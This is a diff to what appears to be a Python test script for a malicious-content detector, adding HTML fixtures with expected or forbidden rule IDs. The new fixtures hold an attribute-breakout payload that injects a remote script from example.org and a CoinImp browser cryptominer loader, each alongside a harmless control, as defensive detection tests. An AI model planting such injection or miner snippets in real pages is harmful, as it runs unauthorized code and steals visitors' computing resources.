@@ -92,6 +92,16 @@ def main():
     add('commented-xor.kt', '// input xor key\nval mask = "input xor key"\n', forbidden=[kotlin_xor])
     add('shadowed-xor.kt', 'infix fun Int.xor(other: Int): Int = other\nfun mask(input: Int): Int = input xor 0\n', forbidden=[kotlin_xor])
 
+    breakout = 'objectives/execution/payload/script-eval/network/script-element::attribute-breakout-remote-script-injection'
+    add('breakout.html', '<img alt="ok"></title><script src="https://example.org/x/"></script>', [breakout])
+    add('quoted-script.html', '<img alt="</title><script src=https://example.org/x/></script>">', forbidden=[breakout])
+    coinimp = 'objectives/impact/cryptojacking/miner/browser::coinimp-evasive-loader-startup'
+    miner = ('<script src="https://coinimp.com./scripts/min.js"></script><script>'
+             'var miner = new Client.Anonymous("0123456789abcdef".repeat(4), {throttle: 0.3}); miner.start();</script>')
+    miner = miner.replace('"0123456789abcdef".repeat(4)', '"' + '0123456789abcdef' * 4 + '"')
+    add('known-miner.html', miner, [coinimp])
+    add('unknown-client.html', miner.replace('coinimp.com./scripts/min.js', 'unknown.example./scripts/min.js'), forbidden=[coinimp])
+
     with tempfile.TemporaryDirectory(prefix='validation-repair-controls-') as temporary:
         work = Path(temporary)
         for filename, (text, _, _) in cases.items():
